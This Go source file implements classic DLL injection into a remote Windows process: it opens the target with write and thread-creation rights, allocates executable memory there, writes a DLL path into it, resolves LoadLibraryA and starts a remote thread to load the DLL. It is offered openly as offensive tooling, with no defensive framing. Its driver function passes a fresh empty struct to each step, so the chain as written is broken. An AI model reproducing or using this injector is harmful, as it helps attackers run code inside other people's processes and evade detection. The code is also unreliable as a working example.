package WindowsTools

import (
	"fmt"
	"syscall"
	"unsafe"

	errors "github.com/pkg/errors"
)

func OpenProcessHandle(i *Inject) error {
	var rights uint32 = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
	var inheritHandle uint32 = 0
	var processID uint32 = i.Pid
	remoteProcHandle, _, lastErr := ProcOpenProcess.Call(uintptr(rights), uintptr(inheritHandle), uintptr(processID))
	if remoteProcHandle == 0 {
		return errors.Wrap(lastErr, "[!] Error! cannot open remote process!!!")
	}
	i.RemoteProcHandle = remoteProcHandle
	fmt.Printf("[*] Input PID: %v\n", i.Pid)
	fmt.Printf("[*] Input DLL: %v\n", i.DllPath)
	fmt.Printf("[+] Process handle: %v\n", unsafe.Pointer(i.RemoteProcHandle))
	return nil
}

func VirutalAllocEx(i *Inject) error {
	var fiAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
	var fiProtect uint32 = PAGE_EXECUTE_READWRITE
	var nullRef uint32 = 0
	lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(i.DllSize),
		uintptr(fiAllocationType),
		uintptr(fiProtect))
	if lpBaseAddress == 0 {
		return errors.Wrap(lastErr, "[!] Error! cannot Allocate memory in remote process!!!")
	}
	i.Lpaddr = lpBaseAddress
	fmt.Printf("[+]base memory address:%v", unsafe.Pointer(i.Lpaddr))
	return nil
}

func WriteProcessMemory(i *Inject) error {
	var nBytesWritten *byte
	dllPathBytes, err := syscall.BytePtrFromString(i.DllPath)
	if err != nil {
		return err
	}
	writeMem, _, lastErr := ProcWriteProcessMemory.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(unsafe.Pointer(dllPathBytes)),
		uintptr(i.DllSize),
		uintptr(unsafe.Pointer(nBytesWritten)))
	if writeMem == 0 {
		return errors.Wrap(lastErr, "[!] Error! cannot write remote process memory")
	}
	return nil
}

func GetLoadLibraryAddress(i *Inject) error {
	//var llibBytePtr *byte
	llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA")
	if err != nil {
		return err
	}
	lladdr, _, lastErr := ProcGetProcAddress.Call(ModKernel32.Handle(), uintptr(unsafe.Pointer(llibBytePtr)))
	if lladdr == 0 {
		return errors.Wrap(lastErr, "[!] Error! cannot get process address")
	}
	i.LoadLibAddr = lladdr
	fmt.Printf("[+]Kernel32.DLL memory address:%v", unsafe.Pointer(ModKernel32.Handle()))
	fmt.Printf("[+]load memory address:%v", unsafe.Pointer(i.LoadLibAddr))
	return nil
}

func CreateRemoteThread(i *Inject) error {
	var nullRef uint32 = 0
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, lastErr := ProcCreateRemoteThread.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(nullRef),
		i.LoadLibAddr,
		i.Lpaddr,
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadId)))
	if remoteThread == 0 {
		return errors.Wrap(lastErr, "[!] Error! cannot create remote process thread!")
	}
	i.RThread = remoteThread
	fmt.Printf("[+] Thread identifier created:%v", unsafe.Pointer(&threadId))
	fmt.Printf("[+] Thread handle created:%v", unsafe.Pointer(i.RThread))
	return nil
}

func WaitForSingleObject(i *Inject) error {
	var dwMilliseconds uint32 = INFINITE
	var dwExitCode uint32
	rWaitValue, _, lastErr := ProcWaitForSingleObject.Call(
		i.RThread,
		uintptr(dwMilliseconds),
	)
	if rWaitValue != 0 {
		return errors.Wrap(lastErr, "[!] Error! Error returning thread wait state.")
	}
	success, _, lastErr := ProcGetExitCodeThread.Call(
		i.RThread,
		uintptr(unsafe.Pointer(&dwExitCode)),
	)
	if success == 0 {
		return errors.Wrap(lastErr, "[!] Error! Error returning thread exit code.")
	}
	closed, _, lastErr := ProcCloseHandle.Call(
		i.RThread,
	)
	if closed == 0 {
		return errors.Wrap(lastErr, "[!] Error! Error returning thread closed handle.")
	}
	return nil
}

func VirtualFreeEx(i *Inject) error {
	var dwFreeType uint32 = MEM_RELEASE
	var size uint32 = 0
	rFreeValue, _, lastErr := ProcVirtualFreeEx.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(size),
		uintptr(dwFreeType),
	)
	if rFreeValue == 0 {
		return errors.Wrap(lastErr, "[!] Errors! Error freeing process memory!")
	}
	fmt.Println("[+] Success: Freed memory region")
	return nil
}

func ProcessInjection() {
	fmt.Println("[*] Process injection running......")
	err := OpenProcessHandle(&Inject{})
	if err != nil {
		panic(err)
	}
	err = VirutalAllocEx(&Inject{})
	if err != nil {
		panic(err)
	}
	err = WriteProcessMemory(&Inject{})
	if err != nil {
		panic(err)
	}
	err = GetLoadLibraryAddress(&Inject{})
	if err != nil {
		panic(err)
	}
	err = CreateRemoteThread(&Inject{})
	if err != nil {
		panic(err)
	}
	err = WaitForSingleObject(&Inject{})
	if err != nil {
		panic(err)
	}
	err = VirtualFreeEx(&Inject{})
	if err != nil {
		panic(err)
	}
}
